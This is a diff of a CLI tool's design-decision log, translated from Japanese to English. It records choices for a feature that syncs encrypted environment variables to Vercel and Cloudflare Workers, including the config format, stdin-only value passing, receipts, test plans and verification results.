-`pullVerifiedEnvironmentMetadata`(名前のみ — **version を持たない**ので plan の材料にならない)、復号 = `pull.ts` の
-`pullVariables`、書き = `push.ts` の `pushVariable`(1 変数 1 version)。メタデータのみ pull には version が無いため、**plan は
-値付き pull(暗号文の配布 = `var.read` 監査行)を使い、復号だけをしない**形になる。
-(4) **既存モジュール名**: `apps/cli/src/sync.ts` / `test/sync.test.ts` はチェーン同期(§6.3)。新機能は `sync-config.ts` /
-`sync-exec.ts` / `sync-receipt.ts` / `sync-plan.ts` と `test/sync-command.test.ts` / `test/sync-units.test.ts` に置き、`sync.ts`
-には触れない(裁定 B)。
-(5) **監査**: AUDIT_SPEC §3.3 のプロジェクト データ系イベントはすべてサーバーが記録するもので、クライアントが申告するイベントは
-無い(ROADMAP SY2 (a) の「監査行 `sync.executed`」は補足 15 X3 で (b) として後回しにされている — 裁定 M)。
-(6) **Vercel CLI 59.11.7 の再確認**(scratchpad へ `bun add vercel@latest`。**版は SY1 と同じ 59.11.7 のまま**):
-`readStandardInput` = `setTimeout(resolve(""), 500)` + `stdin.once("data")`(最初のチャンク 1 回)、`normalizeStdinEnvValue` =
-末尾 `\n` / `\r\n` を 1 つ落とし、落とした残りに改行があれば**元の値をそのまま返す**(= 複数行は末尾改行が残る)。`--force` は API
-の `upsert=true`(**rm → add の窓は無い** — 補足 13 D5 は杞憂)、**空 stdin は「値なし」**として `--non-interactive` なら
-`action_required`(失敗)、対話なら値のプロンプト、`--non-interactive` はグローバルフラグ(59.11.7 の `--help` で確認。
-`@vercel/detect-agent` の判定でも既定になる)。wrangler 4.128.0 の `secret bulk --help` は SY1 と同じ(`--name` / `--env` /
-`--config`、file 省略で stdin)。
-(7) **Bun.spawn の stdin**: `ArrayBufferView` を渡すと Bun が書き切ってから閉じる(bun-types 1.4.0 の `SpawnOptions.Readable`)。
-Vercel の「最初のチャンクを 500 ms だけ待つ」読み方に対して、自前のストリーム書き込みより素直な形。
-(8) **macOS のパイプ容量**: Linux の実測(SY1 改訂 1)は 65,536 バイトまで完全だが、macOS のパイプは初期容量 16 KiB で、それを
-超える書き込みは読み手が読むまでブロックする(= Vercel CLI の 1 回の `data` に収まらない)。SY1 の人間タスク(macOS で数十 KiB)は
-未実施なので、上限は環境差を跨いで安全な 16 KiB に置く(裁定 D)。
+**Premise verification (facts confirmed against the real things / the implementation. All dates 2026-09-06)**:
+(1) **The CLI's boundary** (where `Redacted` gets unwrapped × child processes): decryption's product is wrapped in `Redacted` at `pull.ts`; it's unwrapped only at `run.ts` (just before env injection), `display.ts` (behind the display gate), `push.ts` (the crypto boundary), and `env-rotate.ts` (re-encryption). Child processes are `Bun.spawn` in `live.ts` with **all stdio inherited** and no stdin-writing outlet. `buildChildEnvironment` doesn't pass `MARUHI_*` to children (deepsec S6). CI (`ci-run.ts`) receives a DEK via the lease but **has no master key for §4.1 write signatures** (`pushVariable` requires `signingKey` = the master sig key) → there is currently no path for CI to write receipts to maruhi.
+(2) **Server limits** (`apps/server/src/policy.ts`): value ciphertext 64 KiB, 1,000 active variables per environment, **1,000 versions per variable**, 100 active environments. A receipt as "1 variable overwritten per sync" hits the version cap (ruling F).
+(3) **API implementation points**: read = `values.ts`'s `pullVerifiedEnvironment` (verifies value signatures; doesn't decrypt; has versions) / `pullVerifiedEnvironmentMetadata` (names only — **has no versions**, so it can't be plan material); decrypt = `pull.ts`'s `pullVariables`; write = `push.ts`'s `pushVariable` (1 variable = 1 version). Since metadata-only pull has no versions, **plan uses a valued pull (distributing ciphertext = `var.read` audit rows) and merely doesn't decrypt**.
+(4) **Existing module names**: `apps/cli/src/sync.ts` / `test/sync.test.ts` are chain sync (§6.3). The new feature goes in `sync-config.ts` / `sync-exec.ts` / `sync-receipt.ts` / `sync-plan.ts` and `test/sync-command.test.ts` / `test/sync-units.test.ts`; `sync.ts` is untouched (ruling B).
+(5) **Audit**: all AUDIT_SPEC §3.3 project-data events are server-recorded; there is no client-declared event (ROADMAP SY2 (a)'s "audit row `sync.executed`" was deferred as (b) in supplement 15 X3 — ruling M).
+(6) **Vercel CLI 59.11.7 re-verification** (`bun add vercel@latest` into a scratchpad. **Still the same version 59.11.7 as SY1**): `readStandardInput` = `setTimeout(resolve(""), 500)` + `stdin.once("data")` (one first chunk); `normalizeStdinEnvValue` strips one trailing `\n` / `\r\n`, and if the remainder still has a newline it **returns the original value as-is** (= multi-line keeps its trailing newline). `--force` is the API's `upsert=true` (**no rm → add window** — supplement 13's D5 was unfounded); **empty stdin counts as "no value"** → `action_required` (a failure) under `--non-interactive`, a value prompt when interactive; `--non-interactive` is a global flag (confirmed on 59.11.7's `--help`. Also defaulted by `@vercel/detect-agent` detection). wrangler 4.128.0's `secret bulk --help` is the same as SY1 (`--name` / `--env` / `--config`, stdin when file omitted).
+(7) **Bun.spawn's stdin**: passing an `ArrayBufferView`, Bun writes it fully then closes (bun-types 1.4.0's `SpawnOptions.Readable`). For Vercel's "wait 500 ms for the first chunk" reading, a plainer shape than a hand-rolled stream write.
+(8) **macOS pipe capacity**: Linux measured (SY1 revision 1) is complete up to 65,536 bytes, but macOS pipes start at 16 KiB and writes beyond that block until read (= doesn't fit in Vercel CLI's single `data`). Since SY1's human task (macOS, tens of KiB) hasn't been run, the cap is set at 16 KiB — safe across the environment difference (ruling D).
 
-**A. 段の切り方** — 列挙: (i) 第 1 段 = exec ドライバ(Vercel / Workers)+ リポジトリ設定 + `sync plan` / `sync apply` +
-レシート、第 2 段 = http ドライバ(CI と未導入時。統合トークンは maruhi の変数)+ CI での `sync` + ローテーションのレシート前進
-(M1)、第 3 段 = push 時同期 (c) / `gh workflow run` / autoSync / (ii) レシートを第 2 段へ送り第 1 段は plan なしの apply だけ /
-(iii) http を先にする / (iv) 第 1 段 = exec + 設定 + plan / apply、レシートは第 2 段だが設定に枠だけ予約。第 1 周の新案:
-**M1(`env rotate` がレシートを進める)を第 1 段から外す**(あり — env-rotate.ts は 2,442 行で、再暗号化ループがリポジトリ設定
-〔cwd 依存〕とレシート環境〔それ自身がローテーション対象〕を知る必要があり、第 1 段の 1 PR に載せると危険。外しても apply は
-冪等な上書きで**同じ平文を再送する**だけで安全 — docs に明記)。第 2 周(壊れ方): (ii) は plan が無いと production の既定
-「plan のみ」が成立せず、(iii) は手元の主経路(補足 16)が後回しになる。レシート無しの (iv) は plan が「全部 new」しか言えず
-差分の意味が無い(なし)。**選定 = (i) − M1**。棄却: (ii)(M4 が成立しない)、(iii)(補足 16 に反する)、(iv)(plan が空洞)。
-ROADMAP の SY2 行に段割りを書き、第 1 段の完了注記を付ける(SY2 全体の完了にはしない)。
+**A. How to cut the stages** — enumeration: (i) stage 1 = exec driver (Vercel / Workers) + repo config + `sync plan` / `sync apply` + receipts, stage 2 = http driver (CI and CLI-absent cases. Integration tokens as maruhi variables) + `sync` in CI + rotation's receipt advance (M1), stage 3 = push-time sync (c) / `gh workflow run` / autoSync / (ii) push receipts to stage 2, stage 1 being apply-only with no plan / (iii) do http first / (iv) stage 1 = exec + config + plan / apply with receipts in stage 2 but a slot reserved in the config. Round-1 new option: **remove M1 (`env rotate` advancing receipts) from stage 1** (available — env-rotate.ts is 2,442 lines; its re-encryption loop would need to know the repo config〔cwd-dependent〕and the receipt environment〔itself a rotation target〕, and putting that on stage 1's single PR is dangerous. Without it, apply is an idempotent overwrite that **just re-sends the same plaintext** — safe; noted in docs). Round 2 (failure modes): (ii) without plan, production's default "plan only" can't hold; (iii) defers the local main path (supplement 16). Receipt-less (iv) leaves plan able to say only "all new" — the diff is meaningless (no). **Chosen = (i) − M1**. Rejected: (ii) (M4 can't hold), (iii) (against supplement 16), (iv) (plan is hollow). Wrote the staging on the ROADMAP's SY2 row with a stage-1 completion note (not marking SY2 as a whole complete).
 
-**B. コマンド名と構成** — 列挙: (i) `maruhi sync plan <target>` / `maruhi sync apply <target>`(位置引数 = 設定のターゲット名)/
-(ii) `maruhi sync <target> --plan` / (iii) `sync plan` の引数なし = 全ターゲット / (iv) `sync init` で設定を生成。第 1 周の新案:
-`--env` を持たない(あり — 環境は設定のターゲットが決める。`--env` を受けると「設定と違う環境を同期先へ運ぶ」形が作れる)。
-第 2 周(壊れ方): (iii) は production を含む全ターゲットへの誤 apply を 1 語で起こす(なし)。**選定 = (i)**、`sync` は真の入れ子
-サブコマンド(ADR-0016 決定 6)、bare `maruhi sync` は書き方の誤り(2)。`sync init` は第 1 段に含めない(設定は 10 行の JSON で、
-docs の例を写せば済む。検証の文面が「どのキーが・なぜ」を言う)。`--help` の説明文は動詞始まり 1 行で、plan は「値を復号しない・
-同期先を読み戻さない」、apply は「値は stdin だけ・レシートに記録・production は `--yes`」を言う。モジュール名は前提の確認 (4)。
+**B. Command names and composition** — enumeration: (i) `maruhi sync plan <target>` / `maruhi sync apply <target>` (positional = the config's target name) / (ii) `maruhi sync <target> --plan` / (iii) `sync plan` with no argument = all targets / (iv) generate the config via `sync init`. Round-1 new option: no `--env` (available — the environment is decided by the config's target. Accepting `--env` would enable "carry a different environment than configured to the destination"). Round 2 (failure modes): (iii) causes a mistaken apply to all targets including production with one word (no). **Chosen = (i)**; `sync` is a true nested subcommand (ADR-0016 decision 6); bare `maruhi sync` is a usage error (2). `sync init` isn't in stage 1 (the config is 10 lines of JSON; copy the docs example. The verification wording says "which keys and why"). `--help` descriptions are one verb-led line each: plan says "doesn't decrypt values, doesn't read back the destination"; apply says "values go via stdin only, recorded in a receipt, production needs `--yes`". Module names per premise verification (4).
 
-**C. リポジトリ設定** — 列挙: (i) `maruhi.sync.json`(既定。`--config <file>` で差し替え)/ (ii) `.maruhi/sync.json` /
-(iii) `package.json` の `maruhi` キー / (iv) アンカーファイルへの同居。形式: JSON + `version: 1` + **未知キー拒否**(打ち間違いを
-黙って無視しない)。`project` は省略可で、指定時は `--project` と照合(食い違いは書き方の誤り 2)、無指定なら `defaultProject`。
-運ぶ変数: (a) 明示リストのみ / (b) 環境の全 active(`"all"`)+ `exclude` / (c) 両方。第 1 周の新案: **レシートの環境を同期元に
-できない検査**(あり — `run --env <receipts>` がレシート変数まで子へ注入する形と、レシート自身を同期先へ運ぶ形を塞ぐ)。第 2 周の
-新案: `options` を**プリセットの宣言(`preset.options`)で検証する**(あり — Vercel の `environment` の閉集合・`sensitive` の
-boolean 等をコードでなくデータで持ち、gh を足すときに検証コードを書かない)。第 3 周(壊れ方): `"all"` で新しい変数を push した
-人が知らずに同期先へ運ぶ形は、W3(公開設定・プラットフォーム所有の資源は運ばない)の案内と `exclude` で受ける。明示リストに
-無い名前(打ち間違い)は**何も運ばずに止める**(なし)。**選定 = (i) + (c)**。棄却: (ii)(隠しディレクトリは `git diff` で
-見落とす)、(iii)(package.json が無いリポジトリ)、(iv)(アンカーは `ci run` が検証する暗号学的材料で、意味が違う)。`cwd` /
-`command` はターゲットごとに設定ファイルからの相対(ベンダー CLI はリンク済みディレクトリ / wrangler の設定ファイルを cwd から
-探す)。`command` は「導入済みの版を指す」ためのもので、既定は PATH 上の `vercel` / `wrangler`(`npx` の既定は作らない)。
+**C. Repository config** — enumeration: (i) `maruhi.sync.json` (default. Swap with `--config <file>`) / (ii) `.maruhi/sync.json` / (iii) a `maruhi` key in `package.json` / (iv) cohabit in the anchor file. Format: JSON + `version: 1` + **reject unknown keys** (don't silently ignore typos). `project` is optional; when given it's checked against `--project` (mismatch = usage error 2); when absent, `defaultProject`. Which variables are carried: (a) explicit list only / (b) all actives in the environment (`"all"`) + `exclude` / (c) both. Round-1 new option: **a check that the receipt environment can't be a sync source** (available — blocks both the shape where `run --env <receipts>` injects receipt variables into the child and the shape where the receipt itself is carried to the destination). Round-2 new option: **`options` validated by the preset's declaration (`preset.options`)** (available — Vercel's `environment` closed set, `sensitive`'s boolean, etc. live as data, not code, so adding gh needs no validation code written). Round 3 (failure modes): the shape where someone pushing a new variable under `"all"` unknowingly carries it to the destination is covered by W3's guidance (don't carry public config / platform-owned resources) + `exclude`. A name missing from the explicit list (a typo) **stops having carried nothing** (no). **Chosen = (i) + (c)**. Rejected: (ii) (hidden dirs get overlooked in `git diff`), (iii) (repos without package.json), (iv) (the anchor is cryptographic material `ci run` verifies — different meaning). `cwd` / `command` are per-target, relative to the config file (vendor CLIs look for the linked directory / wrangler's config file from cwd). `command` exists to "point at the installed version"; the default is `vercel` / `wrangler` on PATH (no `npx` default is made).
 
-**D. exec ドライバのインターフェースと宣言的プリセット** — 列挙: (i) ベンダーごとに関数を書く / (ii) **宣言的なデータ**(コマンド・
-argv テンプレート・stdin の形式〔JSON オブジェクト 1 つ / 値そのもの〕・1 プロセスの件数・テレメトリ off の環境変数・値の制約・
-オプションの宣言)+ 小さなトークン言語 / (iii) JSON ファイルから読む。第 1 周の新案: **argv テンプレートの型に値のトークンを
-持たない**(あり — SY1 申し送りの含意 (d)。`{kind:"name"}` / `{kind:"option"}` / `{kind:"switch"}` だけで、値を argv に載せる
-プリセットは型が書けない。単体テストが宣言を走査して `value` / `body` の綴りが無いことも固定)。第 2 周の新案: Vercel の
-**制約を宣言に持つ**(あり — `maxBytes: 16 KiB`〔前提の確認 (8)〕・`nonEmpty`〔(6) の空 stdin〕・`refuseSingleLineTrailingNewline`
-〔(6) の正規化: 末尾改行 1 つで終わる 1 行の値は Vercel CLI では表現できない。値をそのまま送り、この形だけ拒否する — 改行を足して
-送る案は「末尾改行 1 つの値」で `\n\n` になり複数行扱いで元のまま残るため、どちらの形でも失う〕)。第 3 周(壊れ方): wrangler は
-JSON 文字列なので制約なし(空も改行も残る)。UTF-8 でない値は両方とも拒否(JSON と stdin のテキストの前提)。100 件超は 100 ごとに
-分割し、削除(`null`)は同じバッチに同居。Vercel の削除は `env rm NAME env --yes --non-interactive`。**空の入力では呼ばない**
-(wrangler の exit 0 の wart を吸収)。gh は `["secret","set",{name}]` + raw-value + `GH_TELEMETRY=false` の宣言で載る(SY5 —
-コードなし)(なし)。**選定 = (ii)**(TS のデータ。JSON ファイル化は「JSON + モック応答」の趣旨を型で満たしており、外部ファイルの
-読み込み経路を増やさない)。**ベンダー CLI の出力**: 成功時は捨て、失敗時は**値(と複数行値の各行)を伏せ字化・制御文字を中和した
-末尾 20 行**だけを stderr に出す(`scrubVendorOutput`。best effort であることを文面で言う)。`--non-interactive` は常時付ける
-(プロンプトは待たずに失敗に倒れる)。
+**D. The exec driver's interface and declarative presets** — enumeration: (i) write a function per vendor / (ii) **declarative data** (command, argv template, stdin format〔one JSON object / the value itself〕, items per process, telemetry-off env vars, value constraints, option declarations) + a small token language / (iii) read from a JSON file. Round-1 new option: **the argv template's type has no value token** (available — SY1 handoff's implication (d). Only `{kind:"name"}` / `{kind:"option"}` / `{kind:"switch"}` exist, so no preset putting a value on argv can be written. A unit test scans the declarations and pins that no `value` / `body` spelling exists). Round-2 new option: **carry Vercel's constraints in the declaration** (available — `maxBytes: 16 KiB`〔premise verification (8)〕, `nonEmpty`〔(6)'s empty stdin〕, `refuseSingleLineTrailingNewline`〔(6)'s normalization: a single-line value ending in one newline can't be expressed through the Vercel CLI. The value is sent as-is and only this shape is refused — the "append a newline and send" idea becomes `\n\n` for a "single trailing newline" value and is treated as multi-line, surviving unchanged, so either shape loses it〕). Round 3 (failure modes): wrangler is a JSON string so no constraints (empty and newlines survive). Non-UTF-8 values are refused by both (the premise of JSON and stdin text). Over 100 items are split per 100; deletes (`null`) cohabit in the same batch. Vercel's delete is `env rm NAME env --yes --non-interactive`. **Don't call it on empty input** (absorbs wrangler's exit-0 wart). gh rides as the declaration `["secret","set",{name}]` + raw-value + `GH_TELEMETRY=false` (SY5 — no code) (no). **Chosen = (ii)** (TS data. Making it a JSON file already satisfies the "JSON + mock responses" intent via the type, without adding an external-file read path). **Vendor CLI output**: discarded on success; on failure, **only the last 20 lines with values (and each line of multi-line values) redacted and control characters neutralized** go to stderr (`scrubVendorOutput`. The wording says it's best-effort). `--non-interactive` is always passed (prompts collapse to failure instead of waiting).
 
-**E. `ProcessRunner` の拡張** — 列挙: (i) 既存 `run` の引数を広げる / (ii) **`exec` メソッドを足す**(command / cwd / extraEnv /
-stdin: `Redacted<Uint8Array>` → exit code + 捕捉した出力〔末尾 64 KiB〕)/ (iii) 別サービス `VendorProcess`。第 1 周の新案:
-`Redacted` は **`live.ts` の spawn の直前で剥がす**(あり — 値が maruhi を離れる唯一の点。`redacted.test.ts` の棚卸し表に
-`live.ts: 1` を足す)。第 2 周(壊れ方): 未導入の CLI は `Bun.spawn` が throw → 型付きエラー「Cannot start X … maruhi never
-downloads a vendor CLI」。子の環境は `buildChildEnvironment`(`MARUHI_*` を渡さない — S6)を run と共有(なし)。**選定 = (ii)**。
-テストは偽 `ProcessRunner` が stdin のバイト列を記録し、本番の `Bun.spawn` は vitest(Node)から直接呼べないので `bun` で起動する
-プローブ(`test/support/exec-probe.ts` + `live-exec.test.ts`)で実プロセスを固定(16 KiB が丸ごと届く・`MARUHI_TOKEN` 不在・
-出力の捕捉・exit code・未導入のエラー文)。
+**E. `ProcessRunner` extension** — enumeration: (i) widen the existing `run`'s arguments / (ii) **add an `exec` method** (command / cwd / extraEnv / stdin: `Redacted<Uint8Array>` → exit code + captured output〔last 64 KiB〕) / (iii) a separate service `VendorProcess`. Round-1 new option: `Redacted` is **unwrapped right before spawn in `live.ts`** (available — the only point where a value leaves maruhi. Added `live.ts: 1` to `redacted.test.ts`'s inventory table). Round 2 (failure modes): an uninstalled CLI makes `Bun.spawn` throw → the typed error "Cannot start X … maruhi never downloads a vendor CLI". The child's environment shares `buildChildEnvironment` with run (doesn't pass `MARUHI_*` — S6) (no). **Chosen = (ii)**. Tests: a fake `ProcessRunner` records stdin bytes; since the real `Bun.spawn` can't be called directly from vitest (Node), real processes are pinned via a probe launched by `bun` (`test/support/exec-probe.ts` + `live-exec.test.ts`) (16 KiB arrives whole, `MARUHI_TOKEN` absent, output capture, exit code, the uninstalled-CLI error message).
 
-**F. レシート** — 置き場: 設定の `receipts.environment`(X3 (a))。名前: (i) `MARUHI_SYNC_RECEIPT_<target>` / (ii)
-`SYNC_RECEIPT_<TARGET>` / (iii) **`sync-receipt:<target>`**。第 1 周の新案: `:` を含む名前は POSIX 識別子でないので、レシート環境を
-誤って `run` に使うと「環境変数として注入できない名前」として変数名だけを添えて止まる(あり — (i) は `MARUHI_` 拒否で「実行制御名」
-の文面になり読者を惑わせる。(ii) は `-` を含むターゲット名の写像で衝突する)。粒度: (a) ターゲットごと 1 変数 / (b) 変数ごと /
-(c) 全ターゲット 1 変数。第 2 周: (b) は active 変数上限に、(c) は無関係なターゲットの書き込みが競合する(なし)。**選定 = (iii)
-+ (a)**。version 上限(1,000)への対処: (α) 内容が変わらない apply は書かない / (β) **900 で警告**し `maruhi var rm` で新しい
-レシートを始める案内(次の apply は全件を 1 回書き直す)/ (γ) 自動で削除して作り直す(削除は確認付きの破壊操作で、同期の中に
-埋め込まない)。**選定 = (α) + (β)**。中身 = `{version, target, preset, syncedAt, variables: {name: version}}`(値由来のダイジェスト
-なし — W2。名前で引くので rename は「旧名の delete + 新名の add」として自然に出る。`__proto__` のような名前は null プロトタイプで
-扱う)。**失敗した apply でも届いた分はレシートに書く**(次の plan が残りだけを示す)。レシートが書けなければ警告して続ける
-(同期先は更新済みで、次の apply は冪等)。M1(ローテーションの前進)は第 2 段。
+**F. Receipts** — location: the config's `receipts.environment` (X3 (a)). Name: (i) `MARUHI_SYNC_RECEIPT_<target>` / (ii) `SYNC_RECEIPT_<TARGET>` / (iii) **`sync-receipt:<target>`**. Round-1 new option: a name containing `:` isn't a POSIX identifier, so mistaking the receipt environment for `run` stops it with just the variable name as "a name that can't be injected as an env var" (available — (i) gets the "execution-control name" wording from `MARUHI_` rejection, which confuses readers. (ii) collides in the mapping of target names containing `-`). Granularity: (a) 1 variable per target / (b) per variable / (c) 1 variable for all targets. Round 2: (b) hits the active-variable cap; (c) has unrelated targets' writes contending (no). **Chosen = (iii) + (a)**. Handling the version cap (1,000): (α) don't write an apply whose content doesn't change / (β) **warn at 900** and guide to starting a fresh receipt via `maruhi var rm` (the next apply rewrites every entry once) / (γ) auto-delete and recreate (deletion is a confirmed destructive operation; don't embed it inside sync). **Chosen = (α) + (β)**. Contents = `{version, target, preset, syncedAt, variables: {name: version}}` (no value-derived digest — W2. Since lookup is by name, a rename naturally surfaces as "delete old name + add new name". Names like `__proto__` are handled via a null prototype). **A failed apply still writes the delivered part to the receipt** (the next plan shows only the remainder). If the receipt can't be written, warn and continue (the destination is already updated and the next apply is idempotent). M1 (advancing on rotation) is stage 2.
 
-**G. CI モード** — 列挙: (i) 第 1 段で扱わない / (ii) `ci run` の子として環境変数から値を読むモード / (iii) `maruhi ci sync`。
-第 1 周: CI は署名鍵を持たずレシートを書けない(前提の確認 (1))ので、CI の同期は「レシート無しの全件再適用」(補足 7 P3)にしか
-ならず、それは http ドライバと一緒に第 2 段で形を決めるのが自然(あり)。第 2 周: なし。**選定 = (i)**。docs の「In CI」は
-「`maruhi sync` in CI は planned」の 1 文を足すに留める。
+**G. CI mode** — enumeration: (i) not handled in stage 1 / (ii) a mode that reads values from env vars as a `ci run` child / (iii) `maruhi ci sync`. Round 1: CI holds no signing key and can't write receipts (premise verification (1)), so CI sync can only be "re-apply everything with no receipt" (supplement 7 P3), which naturally gets its shape decided together with the http driver in stage 2 (available). Round 2: none. **Chosen = (i)**. Docs' "In CI" gets just one added line: "`maruhi sync` in CI is planned".
 
-**H. http ドライバ** — 第 1 段に含めない(推奨どおり)。通信先の増加(利用者が設定した先 — hosted-design.md §5-1)と統合トークンの
-取り出しは第 2 段の裁定。第 2 周: なし。
+**H. http driver** — not included in stage 1 (as recommended). Increased endpoints (user-configured ones — hosted-design.md §5-1) and extracting the integration token are stage-2 rulings. Round 2: none.
 
-**I. push 時同期 / autoSync / CI 起動** — 第 3 段。設定形式には枠を予約しない(未知キー拒否 + `version` で足せる)。
+**I. Push-time sync / autoSync / CI triggering** — stage 3. No slot reserved in the config format (unknown-key rejection + `version` allow adding later).
 
-**J. エージェント環境と production の既定** — 列挙: (i) production は **`--yes` 必須**(TTY でも) / (ii) TTY なら確認プロンプト、
-非 TTY は `--yes` / (iii) `--production` 専用フラグ。第 1 周の新案: production の判定を**プリセットが宣言する**(あり — Vercel は
-`environment === "production"`、Workers は名前付き環境なし = トップレベル。`production: true|false` で明示上書き)。第 2 周
-(壊れ方): (ii) はエージェント環境で挙動が分かれ、スクリプトの再現性を損なう。(i) は plan を必ず先に出すので「明示フラグで apply」
-の趣旨を満たす(なし)。**選定 = (i)**(`var rm --yes` と同じ語)。`sync` に新しいエージェントゲートは作らない(補足 9)。
-自作プリセットの作成は第 1 段に無いので TTY ガードも不要。
+**J. Agent environments and the production default** — enumeration: (i) production **requires `--yes`** (even on a TTY) / (ii) a confirmation prompt on TTY,
+non-TTY gets `--yes` / (iii) a dedicated `--production` flag. Round-1 new option: **the preset declares** whether a target is production (available — Vercel is `environment === "production"`; Workers has no named environments = top-level. `production: true|false` overrides explicitly). Round 2 (failure modes): (ii) splits behavior across agent environments, hurting script reproducibility. Since (i) always emits a plan first, it fulfills the "explicit flag applies" intent (no). **Chosen = (i)** (same word as `var rm --yes`). No new agent gate is made for `sync` (supplement 9). No custom presets can be authored in stage 1, so no TTY guard is needed.
 
-**K. docs** — 列挙: (i) 別ページ「Sync」 / (ii) **`deploy-targets.mdx` を「`maruhi sync` が主、レシピは代替」に組み替える** /
-(iii) レシピを消す。第 1 周の新案: レシピは「Without maruhi sync」節に**そのまま**残し、`recipes.test.ts` は本文の ```sh を
-「`maruhi run --env production -- ` で始まるブロック」で選ぶ(あり — 数で固定していた検査を形で固定し、sync の使い方の ```sh が
-増えても壊れない。禁止パターンの検査は全 ```sh に掛ける)。第 2 周: なし。**選定 = (ii)**。README / getting-started / index の
-Card は「`maruhi sync`」に。
+**K. docs** — enumeration: (i) a separate "Sync" page / (ii) **rearrange `deploy-targets.mdx` so `maruhi sync` is primary and the recipes are the alternative** / (iii) delete the recipes. Round-1 new option: the recipes stay **as-is** under a "Without maruhi sync" section, and `recipes.test.ts` selects the body's ```sh blocks by "blocks starting with `maruhi run --env production -- `" (available — the checks pinned by count become pinned by shape, and don't break when more ```sh examples of sync usage appear. The forbidden-pattern checks apply to every ```sh). Round 2: none. **Chosen = (ii)**. README / getting-started / index's Card now say "`maruhi sync`".
 
-**L. テスト** — 列挙: (i) `apps/site/test/unit/shims` の偽 CLI を CLI テストから使う / (ii) **偽 `ProcessRunner`(stdin のバイト列を
-記録)+ `bun` で起動する実プロセスのプローブ** / (iii) 実物の CLI。第 1 周の新案: レシートの往復(作成 → 新 version → plan)を
-検査するには「値付き pull と push を受理して状態を進めるモック環境」が要る → `test/support/value-env.ts`(meta-server.ts の
-値つき版。チェーン / deks のハンドラは `chain-handler.ts` に共有)(あり)。第 2 周: なし。**選定 = (ii)**(shims は sh ラッパー
-経由でレシピ用。CLI テストでは値の行き先を ProcessRunner の境界で直接見るほうが強い)。固定する性質: 値が argv / stdout / stderr /
-エラー文面に出ない(複数行値の各行も)、stdin の形式、テレメトリ off の env、cwd、production の `--yes`、レシートの差分だけを
-書く、失敗時に届いた分だけ残る、blocked は何も送らない、末尾改行 / 空 / 16 KiB 超、設定の検証 20 態、未知ターゲットは 2、
-壊れたレシートは fail-closed、version 上限の警告。
+**L. Tests** — enumeration: (i) use `apps/site/test/unit/shims`'s fake CLIs from CLI tests / (ii) **a fake `ProcessRunner` (records stdin bytes) + a real-process probe launched via `bun`** / (iii) real CLIs. Round-1 new option: to exercise the receipt round trip (create → new version → plan) you need "a mock environment that accepts valued pulls and pushes and advances state" → `test/support/value-env.ts` (meta-server.ts's valued version. The chain / deks handlers are shared into `chain-handler.ts`) (available). Round 2: none. **Chosen = (ii)** (the shims serve the recipes via sh wrappers. In CLI tests, seeing where values go at the ProcessRunner boundary is stronger). Pinned properties: values never appear on argv / stdout / stderr / error messages (nor does any line of a multi-line value); stdin format; telemetry-off env; cwd; production's `--yes`; only the receipt's diff is written; on failure only the delivered part remains; blocked sends nothing; trailing newline / empty / over-16 KiB; the 20 config-validation cases; unknown target is 2; a broken receipt is fail-closed; the version-cap warning.
 
-**M. 監査行 `sync.executed`** — 作らない(仕様改訂なし)。ROADMAP SY2 行の (a) の文面を「監査行は補足 15 X3 (b) として後回し
-(第 1 段はレシート = (a))」に直す。
+**M. The audit row `sync.executed`** — not built (no spec revision). The wording of ROADMAP SY2 row's (a) is corrected to "the audit row is deferred as supplement 15 X3 (b) (stage 1 uses receipts = (a))".
 
-**N. 名前の対応付けと除外** — 名前はそのまま(rename の対応を持たない)。除外は `"all"` + `exclude`(C)。
+**N. Name mapping and exclusion** — names pass through as-is (no rename mapping). Exclusion is `"all"` + `exclude` (C).
 
-**O. Vercel 固有** — `--force` 常用(upsert — 窓なし)、`sensitive: false` で `--no-sensitive`、`env update` は使わない(`--force` の
-upsert で足りる)、`--non-interactive` 常時、`project` / `scope` / `gitBranch` は options。
+**O. Vercel-specific** — always `--force` (upsert — no window); `sensitive: false` produces `--no-sensitive`; `env update` isn't used (`--force` upsert suffices); `--non-interactive` always; `project` / `scope` / `gitBranch` are options.
 
-**新たに出た裁定点**: (P) **plan は復号しない**が値付き pull を使う(前提の確認 (3) — メタデータのみ pull に version が無い)。
-`var.read` 監査行は plan でも記録される。第 1 周の新案: 暗号文長 − 16(GCM タグ)で平文長を出し、size / 空の制約を plan で示す
-(あり — 内容の制約〔末尾改行〕は apply で)。(Q) **required の完全性**(M5): required の宣言だけで値が無い変数が選択にあれば
-`run` と同じ `enforceDeclaredPresence` で止め(結びの文だけ「Nothing was sent」)、required の active が選択に無ければ Warning。
-(R) **apply の順序**: レシート → 復号 → plan → 制約検査(全件。1 件でも駄目なら何も送らない)→ production の `--yes` →
-ベンダー呼び出し(書き込み → 削除)→ レシート → 報告。
+**Newly emerged ruling points**: (P) **plan doesn't decrypt** but uses a valued pull (premise verification (3) — metadata-only pull has no versions). The `var.read` audit row is still recorded on plan. Round-1 new option: derive the plaintext length as ciphertext length − 16 (GCM tag) and show size / empty constraints in plan (available — content constraints〔trailing newline〕are shown at apply). (Q) **required completeness** (M5): if a variable selected has a `required` declaration but no value, stop it via the same `enforceDeclaredPresence` as `run` (only the closing line says "Nothing was sent"); if a `required` active isn't selected, a Warning. (R) **apply's order**: receipt → decrypt → plan → constraint check (all entries; if even one fails, nothing is sent) → production's `--yes` → vendor call (writes → deletes) → receipt → report.
 
-**検証(2026-09-06)**: `FALLOW_AUDIT_BASE=origin/main bun run check` 7 段(CLI 931 件・site-unit 24 件)。`--help` golden の更新
-(sync / sync plan / sync apply の 3 段 + root の一覧)と `message-style.test.ts`。`apps/site` の `validate --strict` / `build` / `e2e`。
-実測: wrangler 4.128.0 の `secret bulk --help`(リポジトリのピン)、Vercel CLI 59.11.7(scratchpad — 版・実装とも SY1 と不変)。
-確認できなかったこと: 実アカウントでの通し・macOS のパイプ容量(16 KiB の上限は保守側の推定)・`WRANGLER_LOG_PATH` のデバッグログ
-の監査(D3 — 据え置き)。
+**Verification (2026-09-06)**: `FALLOW_AUDIT_BASE=origin/main bun run check`'s 7 stages (CLI 931 tests, site-unit 24). `--help` golden updated (the 3 stages sync / sync plan / sync apply + root listing) and `message-style.test.ts`. `apps/site`'s `validate --strict` / `build` / `e2e`. Measured: wrangler 4.128.0's `secret bulk --help` (repo pin), Vercel CLI 59.11.7 (scratchpad — version and implementation unchanged from SY1). Not confirmed: an end-to-end run on a real account, macOS pipe capacity (the 16 KiB cap is a conservative estimate), auditing `WRANGLER_LOG_PATH`'s debug logs (D3 — kept as-is).
 
